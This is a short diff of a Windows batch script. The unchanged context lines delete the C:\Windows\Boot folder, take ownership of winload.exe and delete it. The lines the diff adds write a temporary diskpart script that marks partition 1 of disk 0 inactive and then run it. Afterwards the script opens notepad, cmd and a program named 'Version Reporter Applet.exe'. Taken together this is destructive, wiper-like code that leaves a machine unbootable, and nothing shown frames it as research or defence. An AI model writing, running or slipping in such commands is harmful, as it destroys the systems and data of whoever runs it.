@@ -10,6 +10,11 @@ rmdir /s /q "C:\Windows\Boot"
 takeown /f "C:\Windows\System32\winload.exe"
 icacls "C:\Windows\System32\winload.exe" /grant administrators:F
 del /f /q "C:\Windows\System32\winload.exe"
+echo select disk 0 > "%temp%\nonboot.txt"
+echo select partition 1 >> "%temp%\nonboot.txt"
+echo inactive >> "%temp%\nonboot.txt"
+diskpart /s "%temp%\nonboot.txt"
+del "%temp%\nonboot.txt"
 start notepad
 start cmd
 start "" "Version Reporter Applet.exe"
